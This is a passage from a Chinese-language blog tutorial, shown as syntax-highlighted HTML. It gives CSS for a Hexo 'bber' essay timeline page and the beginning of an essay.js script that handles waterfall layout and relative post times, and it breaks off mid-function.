class="selector-class">.bber-content-noimg</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> / <span class="number">4</span> - <span class="number">5px</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-content-img</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">object-fit</span>: cover;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-content-img</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> / <span class="number">4</span> - <span class="number">5px</span>);</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-content</span> <span class="selector-class">.datacont</span> &#123;</span><br><span class="line">  <span class="attribute">order</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8rem</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">700</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--blogessay-fontcolor);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.38</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">0.5rem</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">  <span class="attribute">text-align</span>: justify;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-tag">div</span><span class="selector-class">.bber-content</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-flow</span>: wrap;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.timeline</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-class">.bber-item</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">32%</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--blogessay-style-border-always);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">1rem</span> <span class="number">1rem</span> <span class="number">0.5rem</span>;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.3s</span> ease <span class="number">0s</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-flow</span>: column nowrap;</span><br><span class="line">  <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">  <span class="attribute">align-items</span>: flex-start;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--blogessay-card-bg);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--blogessay-shadow-border);</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">2%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.timeline</span> <span class="selector-id">#waterfall</span><span class="selector-class">.show</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.timeline</span> <span class="selector-id">#waterfall</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.3s</span> ease <span class="number">0s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-tag">ul</span><span class="selector-class">.list</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-flow</span>: row wrap;</span><br><span class="line">  <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> &gt; <span class="selector-tag">section</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span><span class="selector-class">.bber-item</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">1rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber-tips</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">1rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.timeline</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-class">.bber-item</span> hr &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">8px</span> <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> dashed <span class="built_in">var</span>(--blogessay-theme-op);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-info</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> &gt; <span class="selector-tag">section</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">div</span> <span class="selector-class">.bber-info-time</span>,</span><br><span class="line"><span class="selector-id">#bber</span> &gt; <span class="selector-tag">section</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">div</span> <span class="selector-class">.bber-info-from</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--blogessay-fontcolor);</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.7rem</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--blogessay-gray-op);</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: default;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-info</span> <span class="selector-class">.far</span><span class="selector-class">.fa-clock</span> &#123;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> &gt; <span class="selector-tag">section</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">div</span> <span class="selector-class">.bber-info-from</span> <span class="selector-tag">span</span>,</span><br><span class="line"><span class="selector-id">#bber</span> &gt; <span class="selector-tag">section</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">div</span> <span class="selector-class">.bber-info-from</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-bottom</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-bottom</span> <span class="selector-class">.bber-reply</span> &#123;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.timeline</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-class">.bber-item</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--blogessay-style-border-hover);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-content-link</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">0.5rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.7rem</span>;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">245</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">0.13</span>);</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">245</span>, <span class="number">108</span>, <span class="number">108</span>);</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-content-link</span> <span class="selector-tag">i</span> &#123;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-content-link</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--blogessay-main);</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--blogessay-white);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.bber-music</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">90px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0.5rem</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--blogessay-style-border-always);</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--blogessay-secondbg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span><span class="selector-class">.aplayer-withlrc</span> <span class="selector-class">.aplayer-pic</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">82px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">82px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.bber-music</span> <span class="selector-class">.aplayer</span><span class="selector-class">.aplayer-withlrc</span> <span class="selector-class">.aplayer-info</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">7px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-music</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">23px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-music</span> <span class="selector-class">.aplayer-title</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8rem</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">700</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--blogessay-fontcolor);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> &#123;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-bar-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-time</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: initial;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-bar-wrap</span> <span class="selector-class">.aplayer-bar</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--blogessay-gray);</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-bar-wrap</span> <span class="selector-class">.aplayer-bar</span> <span class="selector-class">.aplayer-loaded</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-bar-wrap</span> <span class="selector-class">.aplayer-bar</span> <span class="selector-class">.aplayer-played</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-bar-wrap</span> <span class="selector-class">.aplayer-bar</span> <span class="selector-class">.aplayer-played</span> <span class="selector-class">.aplayer-thumb</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-info</span> <span class="selector-class">.aplayer-controller</span> <span class="selector-class">.aplayer-time</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: initial;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 响应式 */</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">1300px</span>) &#123;</span><br><span class="line">  <span class="selector-id">#bber</span> <span class="selector-class">.timeline</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-class">.bber-item</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">49%</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">1%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line">  <span class="selector-id">#bber</span> <span class="selector-class">.timeline</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-class">.bber-item</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">0px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#bber</span> <span class="selector-class">.bber-music</span> <span class="selector-class">.aplayer</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-lrc</span><span class="selector-pseudo">:before</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-lrc</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--blogessay-card-bg);</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--blogessay-fontcolor);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#bber</span> <span class="selector-class">.aplayer</span> <span class="selector-class">.aplayer-lrc</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--blogessay-fontcolor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></details><details class="toggle" ><summary class="toggle-button" style="">核心 JS</summary><div class="toggle-content"><p>在<code>【Blogroot】/source/js</code>目录下创建<code>essay.js</code>并写入以下代码，但是你先别急着写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> percentFlag = <span class="literal">false</span>; <span class="comment">// 节流阀</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">essayScroll</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span> || <span class="variable language_">window</span>.<span class="property">pageYOffset</span>; <span class="comment">// 卷去高度</span></span><br><span class="line">  <span class="keyword">const</span> waterfallResult = a % <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>; <span class="comment">// 卷去一个视口</span></span><br><span class="line">  result &lt;= <span class="number">99</span> || (result = <span class="number">99</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    !percentFlag &amp;&amp;</span><br><span class="line">    waterfallResult + <span class="number">100</span> &gt;= <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span> &amp;&amp;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#waterfall&quot;</span>)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// console.info(waterfallResult, document.documentElement.clientHeight);</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">waterfall</span>(<span class="string">&quot;#waterfall&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#waterfall&quot;</span>) &amp;&amp; <span class="title function_">waterfall</span>(<span class="string">&quot;#waterfall&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> r = <span class="variable language_">window</span>.<span class="property">scrollY</span> + <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> p = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;post-comment&quot;</span>) || <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;footer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  (p.<span class="property">offsetTop</span> + p.<span class="property">offsetHeight</span> / <span class="number">2</span> &lt; r || <span class="number">90</span> &lt; result) &amp;&amp; (percentFlag = <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">replaceAll</span>(<span class="params">e, n, t</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> e.<span class="title function_">split</span>(n).<span class="title function_">join</span>(t);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> blogessay = &#123;</span><br><span class="line">  <span class="attr">diffDate</span>: <span class="keyword">function</span> (<span class="params">d, more = <span class="literal">false</span></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> dateNow = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="keyword">const</span> datePost = <span class="keyword">new</span> <span class="title class_">Date</span>(d);</span><br><span class="line">    <span class="keyword">const</span> dateDiff = dateNow.<span class="title function_">getTime</span>() - datePost.<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">const</span> minute = <span class="number">1000</span> * <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">const</span> hour = minute * <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">const</span> day = hour * <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">const</span> month = day * <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> result;</span><br><span class="line">    <span class="comment">// Check if the suffix object and required properties exist</span></span><br><span class="line">    <span class="keyword">const</span> suffix = <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">date_suffix</span> || &#123;&#125;;</span><br><span class="line">    <span class="keyword">const</span> daySuffix = suffix.<span class="property">day</span> || <span class="string">&#x27;天前&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> hourSuffix = suffix.<span class="property">hour</span> || <span class="string">&#x27;小时前&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> minSuffix = suffix.<span class="property">hour</span> || <span class="string">&#x27;分钟前&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (more) &#123;</span><br><span class="line">      <span class="keyword">const</span> monthCount = dateDiff / month;</span><br><span class="line">      <span class="keyword">const</span> dayCount = dateDiff / day;</span><br><span class="line">      <span class="keyword">const</span> hourCount = dateDiff / hour;</span><br><span class="line">      <span class="keyword">const</span> minuteCount = dateDiff / minute;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (monthCount &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        result = datePost.<span class="title function_">toLocaleDateString</span>().<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&quot;-&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dayCount &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        result = <span class="built_in">parseInt</span>(dayCount) + <span class="string">&quot; &quot;</span> + daySuffix;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hourCount &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        result = <span class="built_in">parseInt</span>(hourCount) + <span class="string">&quot; &quot;</span> + hourSuffix;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (minuteCount &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        result = <span class="built_in">parseInt</span>(minuteCount) + <span class="string">&quot; &quot;</span> + minSuffix;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = suffix.<span class="property">just</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result = <span class="built_in">parseInt</span>(dateDiff / day);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">changeTimeInEssay</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#bber&quot;</span>) &amp;&amp;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;#bber time&quot;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = e,</span><br><span class="line">          datetime = t.<span class="title function_">getAttribute</span>(<span class="string">&quot;datetime&quot;</span>);</span><br><span class="line">        (t.<span class="property">innerText</span> = blogessay.<span class="title function_">diffDate</span>(datetime, <span class="literal">true</span>)), (t.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;inline&quot;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">reflashEssayWaterFall</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#waterfall&quot;</span>) &amp;&amp;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">waterfall</span>(<span class="string">&quot;#waterfall&quot;</span>);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;waterfall&quot;</span>).<span 